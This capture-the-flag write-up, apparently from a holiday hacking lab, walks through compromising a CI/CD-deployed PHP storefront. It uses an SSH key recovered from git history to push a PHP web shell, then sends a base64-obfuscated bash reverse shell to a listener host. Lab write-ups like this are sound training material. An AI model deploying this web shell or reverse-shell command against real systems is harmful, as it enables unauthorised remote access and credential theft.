# CI-CD Pipeline Challenge

Upon opening the terminal (and waiting a bit for it to build itself out completely) I am presented with this introduction:

Greetings Noble Player, 

Many thanks for answering our desperate cry for help!

You may have heard that some evil Sporcs have opened up a web-store selling 
counterfeit banners and flags of the many noble houses found in the land of 
the North! They have leveraged some dastardly technology to power their 
storefront, and this technology is known as PHP! 

***gasp*** 

This strorefront utilizes a truly despicable amount of resources to keep the 
website up. And there is only a certain type of Christmas Magic capable of 
powering such a thingâ€¦ an Elfen Ring!

Along with PHP there is something new we've not yet seen in our land. 
A technology called Continuous Integration and Continuous Deployment! 

Be wary! 

Many fair elves have suffered greatly but in doing so, they've managed to 
secure you a persistent connection on an internal network. 

BTW take excellent notes! 

Should you lose your connection or be discovered and evicted the 
elves can work to re-establish persistence. In fact, the sound off fans
and the sag in lighting tells me all the systems are booting up again right now.  

Please, for the sake of our Holiday help us recover the Ring and save Christmas!

This is a weird challenge that doesn't really give you much to go on.

However, the following things are currently obvious:

1) I am in a docker container
2) I have root on the docker container


Apparently, this ISN'T the host I'm supposed to exploit! This is just one host on a network to exploit. Let's get to it then.

using

!!! abstract ""
    nmap -sP 172.18.0.0/16

I discovered the following hosts up:

```

After reading Tinsel Upatree's statement I discovered a git repo...which honestly was kinda lame that I had to rely on him to tell me this.

I ran:

!!! abstract ""
    `#!sh git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal`


And it cloned the entire repository.

I ran 

!!! abstract ""
    `#!sh git log`

to find some interesting stuff...

That "whoops" is interesting. Let's get a diff between that and the one before it to find out what made him redact something:

    `#!sh git diff e19f653bde9ea3de6af21a587e41e7a909db1ca5 abdea0ebb21b156c01f7533cea3b895c26198c98`

Got a private key. Cool. I can do some fancy linux stuff but I'll just do it here:

!!! note "Private Key"
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW

    -----END OPENSSH PRIVATE KEY-----

    user is `sporx`


With the new key, I can clone the repository using the following

```sh
grinchum-land:~$ cat > sporx.key <<EOF
> -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW

grinchum-land:~$ eval `ssh-agent`
Agent pid 191
grinchum-land:~$ ssh-add ./sporx.key 
Identity added: ./sporx.key (sporx@kringlecon.com)
```

Now by adding the ssh key, I can clone (and presumably do bad things)

!!! abstract ""
    `#!sh git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git`


Let's modify one of the PHP files to have a comment that I can grep out.

!!! abstract ""
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh vi index.php`
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh git add index.php `
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh git commit -m "tee hee"`
    Author identity unknown

    *** Please tell me who you are.

    Run

      git config --global user.email "you@example.com"
      git config --global user.name "Your Name"

    to set your account's default identity.
    Omit --global to set the identity only in this repository.

    fatal: empty ident name (for <samways@grinchum-land.flag.net.internal>) not allowed
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh git config --global user.email "totally-an-orc@kringlecon.com"`
    
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh git config --global user.name "orcy"`


And the addition I made to index.php?

!!! abstract ""
    `#!php echo("<!-- agr0 -->");`

Then, I committed and pushed.

Then ran a curl on the site and grepped for my tag...

!!! abstract ""
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh curl -s http://172.18.0.88 | grep agr0`

    `<!-- agr0 -->`

Nice. Let's get a little interactive shell.

I created the file `xmas.php`:

```php
<?php
system($_REQUEST['agr0']);
?>
```

Then added it, committed it, and pushed it.

Look at me. Look at me. I am the www-data now.

!!! abstract ""
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh curl -s http://172.18.0.88/xmas.php?agr0=id`
    `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Confirmed I can use post vars, which is easier than GET vars:

!!! abstract ""
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh curl -sd "agr0=id" http://172.18.0.88/xmas.php`
    `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

So do we have bash?

!!! abstract ""
    grinchum-land:~/wordpress.flag.net.internal$ `#!sh curl -sd "agr0=which bash" http://172.18.0.88/xmas.php`
    `/bin/bash`


So can we kick back a shell?

yup

```sh
curl -sd 'agr0=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOC4wLjk5LzkwOTAgMD4mMQ== | base64 -d | bash' http://172.18.0.88/xmas.php
```

Listening with `#!sh nc -lvnp 9090`

The wordpress credentials are in the environment.
